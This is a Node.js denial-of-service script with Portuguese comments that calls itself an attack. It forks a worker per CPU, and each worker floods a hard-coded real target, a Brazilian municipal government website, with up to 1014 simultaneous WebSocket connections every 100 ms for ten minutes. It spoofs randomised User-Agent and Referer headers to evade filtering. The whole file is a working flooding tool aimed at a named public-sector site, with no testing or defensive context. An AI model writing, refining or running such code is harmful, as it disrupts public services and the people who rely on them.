const WebSocket = require('ws');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const userAgents = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
];

const referers = [
  'http://www.google.com',
  'http://www.yahoo.com',
  'http://www.bing.com',
  'http://www.ask.com',
  'http://www.duckduckgo.com',
  'http://www.baidu.com',
  'http://www.yandex.ru'
];

const getRandomElement = (array) => array[Math.floor(Math.random() * array.length)];

if (cluster.isMaster) {
  console.log(`Master ${process.pid} is running`);

  // Fork workers
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }

  cluster.on('exit', (worker, code, signal) => {
    console.log(`worker ${worker.process.pid} died`);
  });
} else {
  console.log(`Worker ${process.pid} started`);

  const targetUrl = 'https://www.guaruja.sp.gov.br/'; // URL do alvo
  const attackDuration = 600000; // Duração do ataque em milissegundos (600 segundos)
  const requestInterval = 100; // Intervalo entre as requisições em milissegundos (0.1 segundo)
  let requestCount = 0;
  let activeWebSockets = 0;
  const maxWebSockets = 1014; // Número máximo de WebSockets simultâneos

  const attack = setInterval(() => {
    if (Date.now() - startTime < attackDuration) {
      if (activeWebSockets < maxWebSockets) {
        const ws = new WebSocket(targetUrl, {
          headers: {
            'User-Agent': getRandomElement(userAgents),
            'Referer': getRandomElement(referers)
          }
        });

        ws.on('open', () => {
          requestCount++;
          activeWebSockets++;
        });

        ws.on('error', (err) => {
          console.error(`Erro na conexão: ${err.message}`);
        });

        ws.on('close', () => {
          activeWebSockets--;
        });
      }
    } else {
      console.log(`Ataque encerrado. Total de conexões: ${requestCount}`);
      clearInterval(attack);
      process.exit();
    }
  }, requestInterval);

  const startTime = Date.now();
}